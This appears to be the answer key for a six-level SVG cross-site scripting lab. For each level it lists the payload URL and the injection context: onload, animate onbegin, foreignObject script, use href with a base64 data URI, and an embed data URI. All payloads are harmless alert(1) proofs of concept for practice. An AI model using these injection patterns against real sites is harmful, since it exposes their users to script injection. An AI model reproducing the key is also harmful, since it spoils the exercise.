# svg-xss — solutions

Reflection inside SVG event handlers, animate values, foreignObject scripts, use href, data: URIs.

### svg-xss-level1

`/svg/level1/?query=alert(1)`

- payload: `alert(1)`
- context: query lands inside `<svg onload="...">` — direct JS expression

### svg-xss-level2

`/svg/level2/?query=alert(1)`

- payload: `alert(1)`
- context: query lands inside `<animate attributeName="onbegin" values="...">` — JS expression

### svg-xss-level3

`/svg/level3/?query=alert(1)`

- payload: `alert(1)`
- context: query inside `<script>` within `<foreignObject>`

### svg-xss-level4

`/svg/level4/?query=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4%3D`

- payload: `data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4=`
- context: `<use href="...">` — external SVG via data URI; needs target click/use ref

### svg-xss-level5

`/svg/level5/?query=alert(1)`

- payload: `alert(1)`
- context: query inside `<svg onload='...'>` inside data: URI of `<embed>`

### svg-xss-level6

`/svg/level6/?query=alert(1)`

- payload: `alert(1)`
- context: `<script` filter irrelevant — query directly in `<svg onload="...">`
